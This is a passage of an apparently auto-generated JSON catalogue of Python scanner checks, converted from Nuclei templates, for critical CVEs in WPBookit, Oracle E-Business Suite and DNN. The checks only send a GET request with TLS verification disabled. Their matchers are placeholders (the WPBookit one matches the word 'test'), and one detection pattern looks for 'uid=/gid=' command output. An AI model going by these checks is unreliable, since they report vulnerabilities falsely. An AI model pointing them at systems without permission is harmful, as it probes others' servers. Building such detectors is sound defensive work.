_on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WPBookit <= 1.0.4 - Unauthenticated Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_6058(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-6058\nName: WPBookit <= 1.0.4 - Unauthenticated Arbitrary File Upload\nSeverity: critical\nDescription: The WPBookit plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the image_upload_handle() function hooked via the 'add_booking_type' route in all versions up to, and including, 1.0.4.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_6058:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-6058\"\n    SEVERITY = \"critical\"\n    NAME = \"WPBookit <= 1.0.4 - Unauthenticated Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(body, \"WPBookit\") / [OR] DSL: status_code == 200; contains_all(body, \"success\",\"status\") / [OR] DSL: status_code == 200; regex(\"uid=\\\\\\\\d+\\\\\\\\([^)]+\\\\\\\\) gid=\\\\\\\\d+\\\\\\\\([^)]+\\\\\\\\) groups=\\\\\\\\d+\\\\\\\\([^)]+\\\\\\\\)\", body)'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WPBookit <= 1.0.4 - Unauthenticated Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_6058(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "wordpress",
          "wpscan",
          "wpbookit",
          "intrusive",
          "file-upload",
          "wp",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_61882",
        "name": "Oracle E-Business Suite 12.2.3–12.2.14 – Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "Oracle Concurrent Processing 12.2.3-12.2.14 contains a remote code execution caused by unauthenticated network access via HTTP, letting unauthenticated attackers fully compromise the system, exploit requires network access via HTTP.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'RespURI, Final, sid' | status HTTP [200] / [OR] DSL: status_code == 200; contains(body, '$Header: ieshostedsurvey.jsp')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "payload",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: payload",
            "default": "sysadmin:INVALID"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-61882\nName: Oracle E-Business Suite 12.2.3–12.2.14 – Remote Code Execution\nSeverity: critical\nDescription: Oracle Concurrent Processing 12.2.3-12.2.14 contains a remote code execution caused by unauthenticated network access via HTTP, letting unauthenticated attackers fully compromise the system, exploit requires network access via HTTP.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_61882:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-61882\"\n    SEVERITY = \"critical\"\n    NAME = \"Oracle E-Business Suite 12.2.3–12.2.14 – Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'RespURI, Final, sid' | status HTTP [200] / [OR] DSL: status_code == 200; contains(body, '$Header: ieshostedsurvey.jsp')\"\n\n        # Simple word matcher simulation\n        matchers = ['RespURI, Final, sid', '$Header: ieshostedsurvey.jsp']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Oracle E-Business Suite 12.2.3–12.2.14 – Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_61882(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-61882\nName: Oracle E-Business Suite 12.2.3–12.2.14 – Remote Code Execution\nSeverity: critical\nDescription: Oracle Concurrent Processing 12.2.3-12.2.14 contains a remote code execution caused by unauthenticated network access via HTTP, letting unauthenticated attackers fully compromise the system, exploit requires network access via HTTP.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_61882:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-61882\"\n    SEVERITY = \"critical\"\n    NAME = \"Oracle E-Business Suite 12.2.3–12.2.14 – Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'RespURI, Final, sid' | status HTTP [200] / [OR] DSL: status_code == 200; contains(body, '$Header: ieshostedsurvey.jsp')\"\n\n        # Simple word matcher simulation\n        matchers = ['RespURI, Final, sid', '$Header: ieshostedsurvey.jsp']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Oracle E-Business Suite 12.2.3–12.2.14 – Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_61882(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2025",
          "oracle",
          "ebusiness",
          "lfi",
          "rce",
          "ssrf",
          "kev",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2025_64095",
        "name": "DNN - Unrestricted Arbitrary File Upload",
        "language": "Python",
        "famille": "CVE",
        "description": "DNN (formerly DotNetNuke) \\u003C 10.1.1 contains an unrestricted file upload vulnerability caused by the default HTML editor provider allowing unauthenticated file uploads and overwriting existing files, letting unauthenticated attackers deface websites and inject XSS payloads, exploit requires no authentication.",
        "severity": "critical",
        "detection": "[AND] mot(s) '{\"group\", delete_type' | mot(s) 'text/plain' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_text_alpha(5))}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-64095\nName: DNN - Unrestricted Arbitrary File Upload\nSeverity: critical\nDescription: DNN (formerly DotNetNuke) \\u003C 10.1.1 contains an unrestricted file upload vulnerability caused by the default HTML editor provider allowing unauthenticated file uploads and overwriting existing files, letting unauthenticated attackers deface websites and inject XSS payloads, exploit requires no authentication.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_64095:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-64095\"\n    SEVERITY = \"critical\"\n    NAME = \"DNN - Unrestricted Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'{\"group\", delete_type\\' | mot(s) \\'text/plain\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['{\"group\", delete_type', 'text/plain']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"DNN - Unrestricted Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2025_64095(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2025-64095\nName: DNN - Unrestricted Arbitrary File Upload\nSeverity: critical\nDescription: DNN (formerly DotNetNuke) \\u003C 10.1.1 contains an unrestricted file upload vulnerability caused by the default HTML editor provider allowing unauthenticated file uploads and overwriting existing files, letting unauthenticated attackers deface websites and inject XSS payloads, exploit requires no authentication.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2025_64095:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2025-64095\"\n    SEVERITY = \"critical\"\n    NAME = \"DNN - Unrestricted Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'{\"group\", delete_type\\' | mot(s) \\'text/plain\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['{\"group\", delete_type', 'text/plain']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return 